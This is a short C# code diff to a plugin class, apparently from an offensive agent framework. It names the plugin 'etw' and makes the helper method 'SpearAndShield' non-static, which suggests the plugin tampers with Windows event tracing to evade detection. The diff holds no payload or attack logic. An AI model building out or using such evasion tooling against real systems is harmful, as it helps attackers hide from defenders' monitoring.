@@ -19,6 +19,7 @@ namespace Plugins
     }
     public class Plugin : AthenaPlugin
     {
+        public override string Name => "etw";
         public override void Execute(Dictionary<string, object> args)
         {
             try
@@ -45,7 +46,7 @@ namespace Plugins
 
             }
         }
-        private static bool SpearAndShield(byte[] bSpear)
+        private bool SpearAndShield(byte[] bSpear)
         {
             try
             {
